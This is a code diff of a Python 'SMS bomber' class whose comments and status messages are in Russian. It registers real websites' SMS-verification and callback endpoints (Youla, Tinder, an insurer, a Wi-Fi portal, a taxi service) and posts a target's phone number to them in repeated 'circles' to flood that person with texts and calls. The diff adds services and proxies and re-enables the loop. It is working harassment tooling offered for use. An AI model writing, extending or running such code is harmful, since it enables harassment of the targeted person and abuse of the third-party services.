@@ -7,38 +7,39 @@ from bs4 import BeautifulSoup as BS
 import time
 import random, string
 
-# TO DO LIST:
-# 1. add 100 services to message atacks
-# 2. add 50 services to call atacks
-# 3. add proxy
-# 4. make an app
-# 5. registration system
-
 class Bomber():
 
     def __init__(self):
-        self.headers = {"user_agent": fake_useragent.UserAgent().random}
         self.services = []
         self.state = "Unknow"
+        self.proxies = { 
+            "http"  : "http://10.10.1.10:3128", 
+            "https" : "https://10.10.1.11:1080", 
+            "ftp"   : "ftp://10.10.1.10:3128"
+        }        
 
     def add_service(self, link, data):
         self.services.append([link, data])
 
     def services_init(self, phone):
-        self.add_service("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", data={})
+        self.add_service("https://youla.ru/web-api/auth/request_code", {"phone": phone})
+        self.add_service("https://3040.com.ua/taxi-ordering", {"callback-phone": phone})
+        self.add_service("https://cabinet.wi-fi.ru/api/auth/by-sms", {"msisdn": phone})
+        self.add_service("https://shop.vsk.ru/ajax/auth/postSms/", {"phone": phone})
+        self.add_service("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", {"phone_number": phone})
+        
 
     def do_circle(self, number):
 
         for num in self.services:
             self.resp = requests.post( num[0], data = num[1] )
-            self.html = BS(self.resp.content, "html.parser"    )
 
             if self.resp.status_code > 400:
                 pass
-                #self.state = "Не удалось отправить сообщение с сайта: " +  num[0]
+                self.state = "Не удалось отправить сообщение с сайта: " +  num[0]
 
-        #self.state = str(number) + " Круг пройден."
-        #time.sleep(0.5)
+        self.state = str(number) + " Круг пройден."
+        time.sleep(0.5)
 
 
     def attack(self, phone, circles):
@@ -48,7 +49,7 @@ class Bomber():
         for i in range(1, self.circles + 1):
             self.do_circle(i)
 
-        self.state = "Атака на номер " + self.phone + " завершена."
+        #self.state = "Атака на номер " + self.phone + " завершена."
 
 bomber = Bomber()
 
